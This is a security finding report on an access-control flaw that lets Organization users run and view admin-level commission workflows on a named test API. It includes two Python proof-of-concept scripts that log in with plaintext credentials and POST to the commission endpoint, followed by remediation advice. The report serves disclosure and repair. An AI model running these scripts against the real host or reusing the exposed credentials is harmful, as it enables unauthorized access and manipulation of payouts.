# Business Logic Role Escalation: Organization Users Can Access Admin-Level Commission Workflows

**ID:** vuln-0020
**Severity:** CRITICAL
**Found:** 2026-02-26 16:56:06 UTC
**Target:** https://commissionstest.callippus.in
**Endpoint:** /api/CommissionRun/RunCommission, /api/CommissionRun/GetCommissionRunDetails
**Method:** GET, POST
**CWE:** CWE-863
**CVSS:** 9.9

## Description

A critical business logic vulnerability was identified in the commission management application that allows Organization users to access and execute commission workflows that should be restricted to higher-privilege roles.

The application's role-based access control for commission workflows is insufficiently implemented, enabling Organization users to access sensitive commission endpoints such as `/api/CommissionRun/RunCommission` and `/api/CommissionRun/GetCommissionRunDetails`. These endpoints should be restricted to Admin or specific commission approval roles but instead return 200 OK responses when accessed by Organization users.

This vulnerability represents a significant business logic flaw in the commission workflow implementation, potentially allowing unauthorized manipulation of commission calculations and payouts.

## Impact

Successful exploitation of this vulnerability could allow Organization users to:

1. **Unauthorized Commission Calculations**: Initiate commission runs without proper approval, potentially manipulating commission amounts
2. **Financial Manipulation**: Execute unauthorized commission calculations that could lead to incorrect payouts
3. **Data Access**: View sensitive commission details that should be restricted to higher-privilege roles
4. **Workflow Bypass**: Bypass the intended segregation of duties between commission initiation and approval
5. **Privilege Escalation**: Gain access to administrative-level commission functionality without proper authorization

The business impact includes potential financial losses, incorrect commission payouts, and unauthorized access to sensitive financial data across multiple organizations.

## Technical Analysis

The vulnerability stems from insufficient role-based access control in the commission workflow implementation:

1. **Inadequate Role Validation**: The application fails to properly validate role permissions at the business logic layer for commission-related endpoints. While the API endpoints exist and are accessible, they lack proper role-based restrictions.

2. **JWT Claim Trust**: The application appears to trust JWT role claims without proper validation of role hierarchy. Organization users have sufficient privileges in their JWT tokens to access commission workflows that should require higher privileges.

3. **Workflow Implementation Flaws**: The commission workflow lacks proper segregation of duties. Organization users can initiate commission calculations that should require separate approval from higher-privilege roles.

4. **Endpoint Access Control**: Commission-related endpoints return 200 OK responses to Organization users instead of proper 403 Forbidden responses, indicating that access control is either missing or improperly implemented.

The root cause appears to be a combination of missing role validation at the service layer and over-trusting client-provided JWT claims without proper role hierarchy validation.

## Proof of Concept

To reproduce this vulnerability:

1. Authenticate as an Organization user (e.g., nlnarayana3858@gmail.com / User@1234)
2. Obtain a valid JWT token for the Organization user
3. Send a GET request to `/api/CommissionRun/GetCommissionRunDetails` with the Organization user token
4. Observe that the endpoint returns a 200 OK response instead of a 403 Forbidden
5. Send a POST request to `/api/CommissionRun/RunCommission` with the Organization user token
6. Observe that the commission calculation workflow can be initiated without proper authorization

The following Python script demonstrates the vulnerability:

```python
import requests

# Organization user credentials
ORG_USER = "nlnarayana3858@gmail.com"
ORG_PASSWORD = "User@1234"
BASE_URL = "https://commissionstest.callippus.in"

# Step 1: Authenticate as Organization user
auth_response = requests.post(
    f"{BASE_URL}/api/authenticate",
    json={"email": ORG_USER, "password": ORG_PASSWORD}
)
token = auth_response.json()["id_token"]

# Step 2: Test access to sensitive commission endpoints
headers = {"Authorization": f"Bearer {token}"}

# Test access to commission run details (should be restricted)
run_details_response = requests.get(
    f"{BASE_URL}/api/CommissionRun/GetCommissionRunDetails",
    headers=headers
)
print(f"GetCommissionRunDetails Status: {run_details_response.status_code}")
print(f"Expected: 403 Forbidden, Actual: {run_details_response.status_code}")

# Test ability to run commission (should be restricted)
run_commission_response = requests.post(
    f"{BASE_URL}/api/CommissionRun/RunCommission",
    headers=headers,
    json={}
)
print(f"RunCommission Status: {run_commission_response.status_code}")
print(f"Expected: 403 Forbidden, Actual: {run_commission_response.status_code}")

# Both endpoints return 200 OK instead of 403 Forbidden
```

```
import requests

# Organization user credentials
ORG_USER = "nlnarayana3858@gmail.com"
ORG_PASSWORD = "User@1234"
BASE_URL = "https://commissionstest.callippus.in"

def test_commission_role_escalation():
    """Test business logic role escalation in commission workflows."""

    print("Testing Business Logic Role Escalation Vulnerability")
    print("=" * 60)

    # Step 1: Authenticate as Organization user
    print(f"Authenticating as Organization user: {ORG_USER}")
    try:
        auth_response = requests.post(
            f"{BASE_URL}/api/authenticate",
            json={"email": ORG_USER, "password": ORG_PASSWORD},
            timeout=10
        )
        auth_response.raise_for_status()
        token = auth_response.json()["id_token"]
        print(f"Authentication successful. Token obtained.")
    except requests.exceptions.RequestException as e:
        print(f"Authentication failed: {e}")
        return False

    # Step 2: Test access to sensitive commission endpoints
    headers = {"Authorization": f"Bearer {token}"}

    # Test access to commission run details (should be restricted)
    print("\nTesting access to GetCommissionRunDetails endpoint:")
    print("This endpoint should return 403 Forbidden for Organization users")
    try:
        run_details_response = requests.get(
            f"{BASE_URL}/api/CommissionRun/GetCommissionRunDetails",
            headers=headers,
            timeout=10
        )
        print(f"Status Code: {run_details_response.status_code}")
        print(f"Expected: 403 Forbidden, Actual: {run_details_response.status_code}")
        if run_details_response.status_code == 200:
            print("✗ VULNERABILITY CONFIRMED: Organization user can access restricted endpoint")
        else:
            print("✓ Access properly restricted")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

    # Test ability to run commission (should be restricted)
    print("\nTesting access to RunCommission endpoint:")
    print("This endpoint should return 403 Forbidden for Organization users")
    try:
        run_commission_response = requests.post(
            f"{BASE_URL}/api/CommissionRun/RunCommission",
            headers=headers,
            json={},
            timeout=10
        )
        print(f"Status Code: {run_commission_response.status_code}")
        print(f"Expected: 403 Forbidden, Actual: {run_commission_response.status_code}")
        if run_commission_response.status_code == 200:
            print("✗ VULNERABILITY CONFIRMED: Organization user can execute commission workflows")
        else:
            print("✓ Access properly restricted")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")

    print("\n" + "=" * 60)
    print("Test completed. Check for vulnerability confirmation above.")

    return True

if __name__ == "__main__":
    test_commission_role_escalation()
```

## Remediation

Implement comprehensive role-based access control for commission workflows:

1. **Add Proper Role Validation at Service Layer**:
   ```csharp
   // Example: Add explicit role checks in commission service
   [Authorize(Roles = "ROLE_ADMIN,CommissionApprover")]
   public IActionResult RunCommission([FromBody] CommissionRunRequest request)
   {
       // Commission calculation logic
   }
   ```

2. **Implement Role Hierarchy Validation**:
   - Create a proper role hierarchy that reflects business requirements
   - Validate that users have appropriate roles before allowing access to sensitive workflows
   - Implement role-based access control at both API and service layers

3. **Enhance JWT Validation**:
   - Implement proper signature validation for JWT tokens
   - Add role hierarchy validation to prevent privilege escalation
   - Consider migrating from HS256 to RS256 for better security

4. **Implement Workflow Segregation**:
   - Separate commission initiation from approval workflows
   - Add explicit approval steps for commission calculations
   - Implement state validation to ensure proper workflow progression

5. **Add Business Logic Validation**:
   ```csharp
   // Validate that users can only access their own organization's data
   if (currentUser.OrganizationId != commissionRun.OrganizationId)
   {
       return Forbid();
   }
   ```

6. **Implement Audit Logging**:
   - Add comprehensive logging for all commission-related actions
   - Log user identity, action performed, and timestamp
   - Monitor for suspicious activity patterns

7. **Add Proper Error Handling**:
   - Return 403 Forbidden for unauthorized access attempts
   - Avoid returning 200 OK for unauthorized requests
   - Implement consistent error responses across all endpoints

